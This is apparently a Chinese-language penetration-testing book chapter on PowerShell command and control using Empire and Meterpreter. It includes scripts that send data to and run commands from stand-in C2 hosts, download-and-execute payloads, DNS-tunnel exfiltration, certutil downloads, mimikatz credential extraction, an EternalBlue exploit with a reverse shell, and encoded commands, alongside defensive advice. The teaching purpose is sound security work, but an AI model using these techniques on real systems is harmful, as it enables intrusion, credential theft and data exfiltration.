

# 第十四章：命令与控制

在不断变化的网络安全环境中，掌握 PowerShell 的力量已经成为渗透测试人员工具包中的基石，尤其是那些希望复制现实世界场景的人员。本章深入探讨了在渗透测试过程中使用 PowerShell 进行**命令与控制**（**C2**）的艺术与科学，在渗透测试中，安全专家模拟攻击以评估防御的强度。

PowerShell，微软的任务自动化框架，已经成为一把双刃剑——既是防御者的工具，也是攻击者的工具。随着组织加强防御，攻击者利用 PowerShell 的多功能性，悄无声息地穿越网络、建立持久连接并执行恶意命令。本章将引导你了解 PowerShell 在渗透测试背景下的复杂应用，揭示其在 C2 操作中的能力。

我们首先探讨基础概念，了解 PowerShell 如何被武器化用于后期利用活动。本章揭示了渗透测试人员如何模拟对抗战术的多种方式，从利用内置的 cmdlet 和脚本到执行复杂的混淆技术。实用的示例将引导你了解执行命令、操作系统和规避检测的复杂性——这一切都在渗透测试的受控框架内进行。

在本章的学习过程中，你将深入了解如何积极使用 PowerShell 来加强防御策略。理解对手的视角对于加强网络防御至关重要，本章为安全专家提供了在渗透测试中使用 PowerShell 进行 C2 操作的知识，帮助他们应对动态变化的安全威胁。

本章涵盖的主要内容如下：

+   后期利用、C2 和网络杀伤链

+   用于 C2 的 PowerShell 组件

+   使用 Empire 进行 C2

+   使用 Meterpreter 和 PowerShell 进行 C2

# 后期利用、C2 和网络杀伤链

后期利用、C2 和网络杀伤链是网络安全中的基本概念。它们共同构成了一个框架，帮助你理解、响应和减轻网络威胁。后期利用是初次入侵后的阶段，攻击者旨在保持访问权限、提升特权、收集情报并在被攻陷的系统中横向移动。此阶段涉及部署恶意软件植入、利用漏洞、窃取凭据以及使用"地面生活"技术来规避检测。

C2 是使攻击者能够远程管理被攻陷系统的基础设施和通信机制。这包括命令服务器、通信协议、加密和有效载荷传递。攻击者使用**域生成算法**（**DGAs**）、分阶段有效载荷、快速变化的 DNS 和加密通信来建立和维持对被攻陷环境的控制。

网络攻击链提供了一个战略模型，概述了从侦察到实现攻击者目标的网络攻击阶段。这些阶段包括侦察、武器化、交付、利用、安装、C2（指挥与控制）和目标执行。理解网络攻击链有助于组织在每个阶段制定针对性的防御措施，以防止、检测和响应网络威胁。在后期利用阶段，组织必须专注于建立持久性、特权升级、数据收集和横向移动。防御措施包括强大的终端保护、定期补丁更新和全面的监控。

C2 防御要求识别并阻止通信通道，监控异常行为，并进行加密检查。积极的措施，如威胁情报、用户教育和事件响应规划，对于应对网络攻击链至关重要。组织可以通过全面解决后期利用、C2 和网络攻击链来加强其网络安全态势。这需要结合技术解决方案、积极措施以及一个明确定义的事件响应策略，以有效应对和缓解网络威胁所带来的复杂挑战。

# 用于 C2 的 PowerShell 组件

PowerShell 是一种功能强大且可扩展的脚本语言，攻击者在后期利用过程中越来越多地使用它来建立 C2 通道。在这次探索中，我们将深入研究可以用于 C2 目的的 PowerShell 组件，并提供详细示例来说明它们的实现。

## 网络通信的 Cmdlets

PowerShell 提供了允许与外部服务器进行通信的 cmdlets，从而促进 C2 通道的建立。例如，`Invoke-RestMethod` cmdlet 可以用于与 Web 服务进行交互。考虑以下示例：

```
 $C2Server = "htt p://c2server.snowcap cyber.com"
$Payload = "Get-Process | Out-String"
# Sending data to C2 server
$response = Invoke-RestMethod -Uri "$C2Server/data" -Method Post -Body $Payload
# Executing received commands
Invoke-Expression $response
```

在这个示例中，PowerShell 脚本将本地系统的进程列表发送到 C2 服务器，并执行收到的命令。

## 有效负载交付的脚本

攻击者常常使用 PowerShell 脚本从外部源下载并执行恶意有效负载。以下示例演示了一个脚本如何下载并执行有效负载：

```
 # Downloading payload from C2 server
$C2Server = "htt p://c2server.snowcap cyber.com"
$PayloadURL = "$C2Server/malicious-payload.exe"
$DownloadPath = "C:\Temp\malicious-payload.exe"
Invoke-WebRequest -Uri $PayloadURL -OutFile $DownloadPath
# Executing the downloaded payload
Start-Process -FilePath $DownloadPath
```

在这个场景中，PowerShell 脚本从 C2 服务器获取恶意负载并在受感染的系统上执行。

## 为了规避检测而编码的有效负载

为了规避检测，攻击者常常对其有效负载进行编码。例如，Base64 编码可以用来模糊化恶意脚本。考虑以下情况：

```
 $EncodedPayload = "Encoded Base64 payload here"
$DecodedPayload = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($EncodedPayload))
# Execute the decoded payload
Invoke-Expression $DecodedPayload
```

在这个示例中，脚本解码一个 Base64 编码的有效负载并执行解码后的 PowerShell 命令。

## 使用函数的动态代码加载

攻击者可以在后期利用过程中动态地将代码加载到内存中。PowerShell 函数提供了一种实现此目的的方法。以下是一个示例：

```
 # Define a malicious function
function Invoke-MaliciousCode {
    # Malicious actions here
    Write-Host "Executing malicious code..." }
# Call the malicious function
Invoke-MaliciousCode
```

在这种情况下，脚本定义了一个带有恶意操作的函数，可以在后期利用阶段的任何时刻调用。

## 用于隐蔽通信的 DNS 隧道

PowerShell 可以用于 DNS 隧道技术，使攻击者能够建立隐蔽的通信通道。以下示例展示了一种简单的 DNS 隧道方法：

```
 $C2Server = "malicious-dns-server.snowcapcyber.com"
$DataToSend = "Data to exfiltrate"
# Encode and send data via DNS
$EncodedData = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($DataToSend))
Resolve-DnsName -Name "$EncodedData.$C2Server"
```

在这个示例中，PowerShell 脚本编码数据并使用 DNS 请求将信息发送到 C2 服务器。

## 利用现有工具技术

PowerShell 允许攻击者利用合法的系统工具进行恶意用途，使得检测变得具有挑战性。以下示例说明了利用现有工具技术：

```
 # Use built-in tool (certutil) for downloading payload
certutil.exe -urlcache -split -f htt p://maliciou s-server.com/malicious-payload.exe
# Execute the downloaded payload
Start-Process -FilePath "C:\Windows\Temp\malicious-payload.exe"
```

在这个实例中，攻击者利用内置的 `certutil` Windows 工具下载一个有效载荷，展示了使用合法工具进行恶意活动。

PowerShell 组件为攻击者提供了一个多功能工具包，用于在后期利用过程中实施 C2。了解这些组件对于防御者有效地检测和缓解此类威胁至关重要。通过监控 PowerShell 活动、采用行为分析并实施强有力的安全措施，组织可以增强其抵御基于 PowerShell 的 C2 攻击的能力。

# 使用 Empire 进行 C2

PowerShell Empire 是一个开源的后期利用框架，因其多功能性而在渗透测试人员和红队成员中广受欢迎。本次全面的探索深入剖析了其复杂性，并演示了它如何在后期利用过程中实施（C2）。

## PowerShell Empire 简介

PowerShell Empire 是一个后期利用框架，旨在为安全专业人员模拟 **高级持续性威胁**（**APT**）场景。它利用 PowerShell 提供一个模块化和可扩展的平台，用于进攻性安全操作。

### 安装和设置

在深入探讨示例之前，让我们先了解一下 PowerShell Empire 的安装和设置：

```
 # Clone the Empire repository from GitHub
git clone http s://githu b.com/BC-SECURITY/Empire.git
# Change into the Empire directory
cd Empire
# Run the setup script
./setup/install.sh
```

安装完成后，启动 Empire 控制台：

```
 # Launch the Empire console
./empire
```

这将打开 Empire 控制台，操作员可以在其中与各种模块交互并配置 C2 的监听器。

### C2 的监听器

Empire 使用监听器来建立 C2 通道。让我们创建一个基本的 HTTP 监听器：

```
 # Within the Empire console
listeners
uselistener http
set Name http_listener
set Host 0.0.0.0
set Port 8080
execute
```

这将设置一个 HTTP 监听器，允许代理（受感染的系统）与 Empire 服务器进行通信。

## 生成和交付有效载荷

Empire 生成的有效载荷充当受感染系统上的代理。这些代理与 Empire 服务器进行通信。为 Windows 目标生成一个 PowerShell 有效载荷：

```
 # Within the Empire console
usestager windows/launcher_ps
set Listener http_listener
generate
```

这将生成一个 PowerShell 单行有效载荷。你可以通过多种方式将此有效载荷传送到目标系统，例如通过钓鱼或漏洞利用。

## 在受感染的系统上执行命令

一旦有效载荷在目标系统上执行，它就会与 Empire 服务器建立连接。你可以与代理进行交互并执行命令：

```
 # Within the Empire console
interact <agent_ID>
# Execute a command on the agent
shell whoami
```

这展示了在受感染系统上执行一个简单命令（在此案例中，获取当前用户）。

## 用于高级任务的后期利用模块

Empire 包括了大量后期利用模块，用于执行高级操作。我们来使用`mimikatz`模块从被攻陷的系统中提取凭证：

```
 # Within the Empire console
interact <agent_ID>
# Load the mimikatz module
usemodule credentials/mimikatz
# Run mimikatz to extract credentials
execute
```

这个示例展示了如何使用一个专用模块在被攻陷系统上进行凭证提取。

## 数据外泄

Empire 提供模块来从被攻陷系统中提取数据。`powershell/clipboard/paste`模块可以用来提取存储在剪贴板中的数据：

```
 # Within the Empire console
interact <agent_ID>
# Load the clipboard exfiltration module
usemodule powershell/clipboard/paste
# Run the exfiltration module
execute
```

这展示了如何使用 Empire 模块，演示操作员如何从被攻陷的系统中提取敏感数据，如剪贴板内容。

## 网页驱动攻击

Empire 允许操作员进行网页驱动攻击，利用托管在网页服务器上的恶意脚本。下面是一个在 Empire 中设置网页服务器并将恶意有效载荷交付给目标的示例：

```
 # Within the Empire console
usestager windows/launcher_bat
set Listener http_listener
set OutFile /var/www/html/malicious.bat
generate
```

这将设置一个网页服务器，并生成一个 BAT 文件，目标访问时执行有效载荷，建立与 Empire 服务器的连接。

## 避免杀毒软件检测

PowerShell Empire 通过混淆技术提供逃避杀毒软件检测的功能。我们来演示如何混淆一个 PowerShell 脚本：

```
 # Within the Empire console
interact <agent_ID>
# Load the obfuscation module
usemodule powershell/obfuscate
# Set the script to obfuscate
set Script 'Write-Host "Hello, Empire!"' execute
```

这个示例展示了操作员如何使用 Empire 的混淆模块来混淆一个简单的 PowerShell 脚本。

## 动态脚本编写

PowerShell Empire 支持动态脚本编写，允许操作员在运行时执行脚本。下面是一个在被攻陷的系统上运行动态 PowerShell 脚本的示例：

```
 # Within the Empire console
interact <agent_ID>
# Run a dynamic PowerShell script
powershell -Command "Write-Host 'Dynamic script executed'"
```

操作员可以利用此功能在后期利用阶段（post-exploitation）在被攻陷系统上运行自定义的 PowerShell 脚本。

## 防御措施

防御者必须采用强大的安全措施来检测和缓解 PowerShell Empire 的活动。实施网络监控、应用白名单和端点保护解决方案至关重要。定期的安全培训可以帮助用户识别社会工程攻击，从而增强防御能力。

PowerShell Empire 是一个强大的后期利用框架，允许安全专家模拟真实世界的场景，并测试系统抵御高级威胁的能力。虽然它为红队演练和渗透测试提供了一个有效的工具，但也突出了组织实施强大防御措施的重要性，以防御这种复杂的攻击。了解 PowerShell Empire 的功能对于防御者和安全专家来说至关重要，有助于在面对不断变化的威胁时加强网络安全防护。

# 使用 Meterpreter 和 PowerShell 进行 C2

Meterpreter 是 Metasploit 框架中的一个强大有效载荷，结合 PowerShell，提供了一个强有力的后期利用（C2）组合。在这个详细的探讨中，我们将探讨如何将 Meterpreter 与 PowerShell 结合使用，以建立并维持对被攻陷系统的控制。

## Meterpreter 简介

Meterpreter 是 Metasploit 框架中的一个后期利用有效载荷。它旨在提供强大的功能，以与被破坏的系统进行交互和控制。Meterpreter 的一个显著优势是其多功能性和可以在内存中运行，使得传统安全措施难以检测到它。

## 设置攻击环境

在我们深入研究示例之前，让我们使用 Metasploit 设置一个基础环境，以了解基本概念：

```
 # Open a terminal and launch Metasploit
msfconsole
```

## 利用漏洞

假设我们已经在目标系统中发现了一个漏洞用于演示目的。我们将使用 EternalBlue 漏洞攻击来破坏一台 Windows 机器（请注意，这是一个假设场景，应该仅在您获得许可的受控环境中执行）：

```
 # Within Metasploit console
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target_IP>
exploit
```

这是利用 EternalBlue 漏洞对目标系统进行未经授权的访问。

## 利用 Meterpreter

一旦我们成功利用目标系统的漏洞，就可以利用 Meterpreter 建立连接并获得控制：

```
 # Within Metasploit console
use payload/windows/meterpreter/reverse_tcp
set LHOST <attacker_IP>
exploit
```

这将创建一个反向 TCP 连接到攻击者的机器，在被破坏的系统上提供一个 Meterpreter shell。

## 使用 Meterpreter 进行后期利用

Meterpreter 提供了广泛的功能，用于后期利用活动。让我们探索一些常见任务。

### 文件系统操作

接下来，我们将使用 Meterpreter 列出一系列文件，将文件从服务器上传到目标，并将文件从目标下载到服务器：

```
 # List files in the current directory
ls
# Upload a file to the target system
upload /local/path/to/file.txt C:\\target\\path\\
# Download a file from the target system
download C:\\target\\path\\file.txt /local/save/
```

### 系统信息收集

我们可以使用 Meterpreter 通过 `sysinfo` 和 `getsystem` 命令对目标系统进行分析。这些命令会生成一份详细报告，记录目标系统的功能：

```
 # Display system information
sysinfo
# Gather information about the target machine
getsystem
```

### 权限提升

我们可以使用 Meterpreter 加载支持各种功能的模块。接下来，我们将使用 Meterpreter 加载一个模块，尝试进行权限提升：

```
 # Attempt privilege escalation using known exploits
use post/windows/escalate/getsystem
```

## 集成 PowerShell 以增强功能

为了增强后期利用能力，我们可以在 Meterpreter shell 中利用 PowerShell。这使我们能够利用 PowerShell 的广泛功能进行更加隐蔽和灵活的操作：

```
 # Launch PowerShell within Meterpreter
powershell_shell
```

现在，我们在 Meterpreter shell 中有了一个 PowerShell 提示符：

+   使用 PowerShell 执行命令：

    ```
     # Execute PowerShell commands
    (Get-WmiObject Win32_ComputerSystem).Name
    ```

    这个示例展示了如何在 Meterpreter 会话中使用 PowerShell 获取计算机名。

+   下载并执行 PowerShell 脚本：

    ```
     # Download a PowerShell script
    Invoke-WebRequest -Uri http://attacker_IP/script.ps1 -OutFile C:\malicious_script.ps1
    # Execute the downloaded script
    C:\malicious_script.ps1
    ```

    这个示例展示了如何在 Meterpreter 中使用 PowerShell 下载并执行恶意脚本。

## 混淆 PowerShell 命令

为了避免被检测到，攻击者通常会混淆 PowerShell 命令。在 Meterpreter 的上下文中，可以混淆 PowerShell 命令，使得分析更加困难：

```
 # Obfuscate a simple PowerShell command
powershell -enc JABzAHMAaQBtAGUAbgB0AC4AbgBuAGUAdwAtAGwAZQBuAGEAcwBrAGUAbgAuAEwAbwBnAGcA
```

这个示例展示了如何使用 base64 编码进行混淆。

## 使用 PowerShell 进行 C2（命令与控制）

现在，让我们探索在 Meterpreter 中使用 PowerShell 进行 C2 操作。这涉及在攻击者和被攻陷系统之间建立持久连接。假设 PowerShell Empire 已经部署在外部服务器上，我们可以在 Meterpreter 中下载并执行它：

```
 # Download PowerShell Empire
Invoke-WebRequest -Uri http://attacker_IP/powershell_empire.ps1 -OutFile C:\powershell_empire.ps1
# Execute PowerShell Empire
powershell -ExecutionPolicy Bypass -File C:\powershell_empire.ps1
```

这演示了 Meterpreter 在建立后，如何利用 PowerShell 下载并执行更高级的后期利用框架。

## 防御措施

为了防御利用 Meterpreter 和 PowerShell 进行的攻击，组织应实施强有力的安全措施：

+   **网络监控**：使用网络监控工具检测异常的流量模式或连接

+   **端点保护**：利用端点保护解决方案检测并阻止恶意活动

+   **应用程序白名单**：限制未经授权的应用程序的执行，包括 PowerShell 脚本

+   **定期审计和补丁管理**：定期审计系统漏洞并应用补丁，以减轻已知的安全问题

+   **用户教育**：教育用户了解打开未知文件或点击可疑链接的风险

总结来说，Meterpreter 和 PowerShell 的结合在攻击者进行后期利用时构成了重大威胁。理解它们的功能并采取有效的防御措施，对于组织减轻与这些复杂攻击技术相关的风险至关重要。定期更新系统、监控网络流量和教育用户是保持安全韧性的关键。

# 总结

本章中，我们探讨了在渗透测试背景下使用 PowerShell 进行 C2 控制的复杂领域。从基础知识开始，我们探索了如何将 PowerShell —— 这一为合法管理任务设计的工具 —— 被防御者和攻击者同时利用。本章揭示了将 PowerShell 武器化用于后渗透活动的艺术性，提供了实际案例，指导你了解执行命令、渗透系统以及规避检测的细节。从利用内置 cmdlet 到执行复杂的混淆技术，你对攻击者在渗透测试中采用的策略有了全面的理解。本章强调了 PowerShell 的双重特性 —— 它是防御者加强网络安全防护的强大资产，同时也是攻击者穿越网络的有力武器。通过实际场景，你能够在受控环境中模拟攻击者的战术，主动强化防御。随着我们深入了解攻击者的视角，本章为安全专业人士提供了可操作的见解，帮助他们主动加强网络防御。通过掌握基于 PowerShell 的 C2 控制的动态格局，你在永无止境的渗透测试猫鼠游戏中获得了战略优势。本章传授的知识是安全从业人员希望在不断变化的网络安全环境中保持领先一步的重要资源。

在下一章中，我们将深入探讨在 Microsoft Windows 环境中使用 PowerShell 进行后渗透操作的强大领域。
